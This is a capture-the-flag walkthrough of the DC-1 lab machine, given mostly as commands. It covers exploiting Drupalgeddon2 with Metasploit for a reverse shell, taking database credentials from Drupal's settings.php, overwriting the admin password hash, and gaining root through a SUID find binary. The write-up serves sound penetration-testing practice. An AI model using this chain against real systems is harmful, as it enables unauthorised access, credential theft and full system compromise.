============================================================
TARGET: DC-1 (Proving Grounds Play)
DIFFICULTY: Easy
OS: Linux (Debian 7)
DATE: November 25, 2025
============================================================

[PHASE 1: RECONNAISSANCE]
# Scan the target for open ports and versions
nmap -sC -sV <TARGET_IP>

# Findings:
# - Port 22 (SSH)
# - Port 80 (HTTP) - Drupal 7
# - Robots.txt revealed /CHANGELOG.txt which confirms Drupal version.


[PHASE 2: INITIAL ACCESS (Exploitation)]
# Used Metasploit to exploit Drupalgeddon2 (CVE-2018-7600)

msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS <TARGET_IP>
set LHOST tun0              # Use VPN Interface
set AutoCheck false         # Force run even if check fails
run

# Result: Meterpreter/Shell session opened as 'www-data'


[PHASE 3: STABILIZATION]
# The initial shell is unstable. Spawn a PTY shell using Python.
# (Note: This machine uses Python 2)

shell
python -c 'import pty; pty.spawn("/bin/bash")'


[PHASE 4: ENUMERATION & LOOT]
# Flag 1 location
cat flag1.txt

# Found DB credentials in Drupal config
cat sites/default/settings.php
# > Username: dbuser
# > Password: (found in file)


[PHASE 5: LATERAL MOVEMENT (Database Takeover)]
# Goal: Reset Admin password and clear brute-force blocks.

# Step A: Generate a valid Drupal 7 password hash for the word "password"
# (Must run this inside the victim shell)
php scripts/password-hash.sh password
# > Copy the output hash (starts with $S$...)

# Step B: Login to MySQL
mysql -u dbuser -p
# (Enter password found in settings.php)

# Step C: Update the database
use drupaldb;
DELETE FROM flood;       # Unblocks the admin account
UPDATE users SET pass = '$S$D...' WHERE name = 'admin';  # Paste generated hash
exit;

# Step D: Login to Web Interface
# URL: http://<TARGET_IP>
# User: admin / password


[PHASE 6: PRIVILEGE ESCALATION (Root)]
# Found Flag 3 in Drupal Content dashboard. Hinted at "perms" and "exec".

# Search for SUID binaries (files that run as Root)
find / -perm -4000 2>/dev/null

# Result: /usr/bin/find is SUID root.

# Exploit 'find' to spawn a root shell
# We use -exec to run /bin/bash with preserved permissions (-p)
find . -exec /bin/bash -p \; -quit

# Verification
whoami
# > root

[PHASE 7: FINAL PROOF]
cd /root
cat thefinalflag.txt
cat proof.txt
